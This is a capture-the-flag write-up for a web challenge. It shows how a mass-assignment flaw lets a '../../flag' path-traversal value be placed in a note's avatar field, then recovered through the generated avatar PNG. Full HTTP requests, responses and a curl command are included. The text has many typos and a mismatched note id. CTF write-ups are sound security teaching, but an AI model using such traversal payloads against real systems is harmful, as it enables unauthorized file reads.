# Challenge

Url:  https://mass-notes.chal.intentsummit.org/

Type: LFI

Level: Medium

# Challenge Overview

When we go to the website, we taked our note and display our note body and avator png file.

Exmaple Request:
`https://mass-notes.chal.intentsummit.org/note.html?note=%7B%22title%22%3A%22WorkingExploit%20real%20not%20test%22%2C%22content%22%3A%22Workingexploits%20is%20surely%20working%20i%20think%20so%22%2C%22avatar%22%3A%22..%2F..%2Fflag%22%2C%22_id%22%3A%226193a77d989bedd8dfa70292%22%2C%22__v%22%3A0%7D`

URl Decode: `{"title":"WorkingExploit real not test","content":"Workingexploits is surely working i think so","avatar":"../../flag","_id":"6193a77d989bedd8dfa70292","__v":0}`

As you can see there are 4 part which are `title`, `content`, `avator`, `id`. 

Actually the main important parts are `id` and `avator`. After testing while, I know that `avator` have a `LFI` vuln. And also `id` part is important too. 

Because when we created the note, it was display the `avator png file` too. but do you know that where this png came from? Well, when you look the source code of website. 

In the line(36), 

```
img.src = "/avatar/" + note._id + ".png";
```
So, we can know now that the server is creating the png with the `note` `id` from the note that we created in the `/avator/` path and with `.png`. 

`Example: "_id":"6193a77d989bedd8dfa70292"` (**This is the note id from the note that we created, intercept with burp will be clear or you can see in the browser url bar too**)

# Solution

So intercept with burp and add `"avatar":"../../flag"`. We add this in request because the `avatar` path have vuln and we can do lfi to get `../../flag` file.
(Note: `You need to intercept with burp because Server hide a one request`)

Our request:
```
POST /note HTTP/2
Host: mass-notes.chal.intentsummit.org
Cookie: intent-ctf-session=61f4d5867928543117576fbd2d6ee088
Content-Length: 96
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Content-Type: application/json
Accept: */*
Origin: https://mass-notes.chal.intentsummit.org
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://mass-notes.chal.intentsummit.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{
  "title":"WorkingExploit",
  "content":"Workingexploits is surely working",
  "avatar":"../../flag" (THis avatar path is need to add ourself )
}
```

# Our response

```
HTTP/2 200 OK
Date: Tue, 16 Nov 2021 12:41:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 135
X-Powered-By: Express
Etag: W/"87-3XFh8o8KS5YKX6GSUuHbj7R/DyQ"
Strict-Transport-Security: max-age=15724800; includeSubDomains

{
  "title":"WorkingExploit",
  "content":"Workingexploits is surely working",
  "avatar":"../../flag",
  "_id":"6193a6f2989bedd8dfa7028a",
  "__v":0
}
```
# Quick Note

We knew that there are many path other than `title and content` because of `https://mass-notes.chal.intentsummit.org/note.html?note={"title":"WorkingExploit real not test","content":"Workingexploits is surely working i think so","avatar":"../../flag","_id":"6193a77d989bedd8dfa70292","__v":0}` browser url bar or you can know with brup too.

# Solution Part(2)

So we got our note `id`, we injected lfi in `avatar` path. So, our flag file will be in `avatar png` file. So, our png file will be `https://mass-notes.chal.intentsummit.org/avatar/6193a6f2989bedd8dfa7028a(id of our note).png`. 

So we can get flag by easily using curl
```
curl -k "https://mass-notes.chal.intentsummit.org/avatar/6193a77d989bedd8dfa70292.png"
```

# FLag
INTENT{d0nt_mass_with_ap1s}
